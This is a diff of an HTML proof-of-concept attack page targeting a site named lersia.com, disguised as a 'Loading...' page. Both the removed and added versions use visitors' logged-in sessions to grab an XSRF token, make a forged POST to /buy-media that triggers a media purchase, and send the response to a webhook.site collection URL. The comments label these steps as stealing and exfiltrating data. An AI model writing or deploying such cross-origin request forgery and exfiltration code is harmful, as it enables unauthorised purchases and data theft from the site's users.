@@ -1,52 +1,47 @@
 <!DOCTYPE html>
 <html>
-<head>
-    <title>Loading...</title>
-    <style>
-        body { background: #0a0e27; display: flex; justify-content: center; align-items: center; height: 100vh; font-family: monospace; color: white; }
-        .spinner { width: 50px; height: 50px; border: 3px solid #333; border-top: 3px solid #ff3333; border-radius: 50%; animation: spin 1s linear infinite; margin: 20px auto; }
-        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
-        iframe { display: none; }
-    </style>
-</head>
+<head><title>Loading...</title></head>
 <body>
-    <div><div class="spinner"></div><p>Loading...</p></div>
-    <iframe id="exploitFrame" src="https://lersia.com"></iframe>
+<script>
+(async () => {
+    // Step 1: Get CSRF token (CORS allows this!)
+    await fetch('https://lersia.com/api/admin/sanctum/csrf-cookie', {
+        method: 'GET',
+        credentials: 'include'
+    });
     
-    <script>
-    const WEBHOOK_URL = 'https://webhook.site/fbd7cfdc-bb8a-4841-878f-382a15e228db';
+    await new Promise(r => setTimeout(r, 500));
     
-    document.getElementById('exploitFrame').onload = function() {
-        const frameWindow = document.getElementById('exploitFrame').contentWindow;
-        
-        // Inject exploit into the iframe (same origin as lersia.com)
-        const exploitCode = `
-            (async function() {
-                await fetch('/sanctum/csrf-cookie', { credentials: 'include' });
-                await new Promise(r => setTimeout(r, 500));
-                let token = null;
-                const cookies = document.cookie.split(';');
-                for (let cookie of cookies) {
-                    if (cookie.trim().startsWith('XSRF-TOKEN=')) {
-                        token = decodeURIComponent(cookie.trim().substring(11));
-                        break;
-                    }
-                }
-                const res = await fetch('/buy-media', {
-                    method: 'POST',
-                    credentials: 'include',
-                    headers: { 'Content-Type': 'application/json', 'X-XSRF-TOKEN': token },
-                    body: JSON.stringify({ id: '665', resolution: '1920', type: 'Video' })
-                });
-                const data = await res.json();
-                fetch('${WEBHOOK_URL}', { method: 'POST', mode: 'no-cors', body: JSON.stringify(data) });
-            })();
-        `;
-        
-        const script = frameWindow.document.createElement('script');
-        script.textContent = exploitCode;
-        frameWindow.document.body.appendChild(script);
-    };
-    </script>
+    // Step 2: Extract token from cookies
+    let token = null;
+    const cookies = document.cookie.split(';');
+    for (let cookie of cookies) {
+        if (cookie.trim().startsWith('XSRF-TOKEN=')) {
+            token = decodeURIComponent(cookie.trim().substring(11));
+            break;
+        }
+    }
+    
+    // Step 3: Attack - steal data (CORS allows reading response!)
+    const res = await fetch('https://lersia.com/buy-media', {
+        method: 'POST',
+        credentials: 'include',
+        headers: {
+            'Content-Type': 'application/json',
+            'X-XSRF-TOKEN': token
+        },
+        body: JSON.stringify({ id: '665', resolution: '1920', type: 'Video' })
+    });
+    
+    const data = await res.json();
+    
+    // Step 4: Exfiltrate to your webhook
+    fetch('https://webhook.site/fbd7cfdc-bb8a-4841-878f-382a15e228db', {
+        method: 'POST',
+        mode: 'no-cors',
+        body: JSON.stringify(data)
+    });
+})();
+</script>
 </body>
 </html>
